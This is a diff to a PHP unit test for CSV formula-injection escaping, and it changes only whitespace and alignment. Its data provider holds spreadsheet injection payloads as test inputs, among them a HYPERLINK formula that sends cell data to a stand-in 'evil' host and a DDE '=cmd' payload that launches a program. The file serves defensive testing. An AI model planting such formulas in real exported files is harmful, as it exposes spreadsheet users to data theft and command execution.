@@ -34,7 +34,7 @@ class CsvTest extends TestCase
         // The escaped cell must begin either with a bare apostrophe (no special chars)
         // or with the quoted-form opener "'  (the cell is also quoted because it contains
         // commas, quotes, CR or LF). Either way Excel/Sheets render it as literal text.
-        $beginsWithApos       = str_starts_with($escaped, "'");
+        $beginsWithApos = str_starts_with($escaped, "'");
         $beginsWithQuotedApos = str_starts_with($escaped, "\"'");
 
         $this->assertTrue(
@@ -47,13 +47,13 @@ class CsvTest extends TestCase
     {
         return [
             'equals_plain' => ['=SUM(A1:A5)'],
-            'equals_link'  => ['=HYPERLINK("https://evil/?c="&A1, "click")'],
-            'plus'         => ['+1+2'],
-            'minus'        => ['-2+3'],
-            'at'           => ['@SUM(1)'],
-            'tab'          => ["\tevil"],
-            'cr'           => ["\revil"],
-            'dde_classic'  => ['=cmd|\'/c calc\'!A0'],
+            'equals_link' => ['=HYPERLINK("https://evil/?c="&A1, "click")'],
+            'plus' => ['+1+2'],
+            'minus' => ['-2+3'],
+            'at' => ['@SUM(1)'],
+            'tab' => ["\tevil"],
+            'cr' => ["\revil"],
+            'dde_classic' => ['=cmd|\'/c calc\'!A0'],
         ];
     }
 
@@ -65,11 +65,11 @@ class CsvTest extends TestCase
 
     public function test_row_terminates_with_crlf(): void
     {
-        $this->assertSame("a,b,c\r\n", Csv::row(['a','b','c']));
+        $this->assertSame("a,b,c\r\n", Csv::row(['a', 'b', 'c']));
     }
 
     public function test_row_escapes_each_cell(): void
     {
-        $this->assertSame("'=foo,\"bar,baz\"\r\n", Csv::row(['=foo','bar,baz']));
+        $this->assertSame("'=foo,\"bar,baz\"\r\n", Csv::row(['=foo', 'bar,baz']));
     }
 }
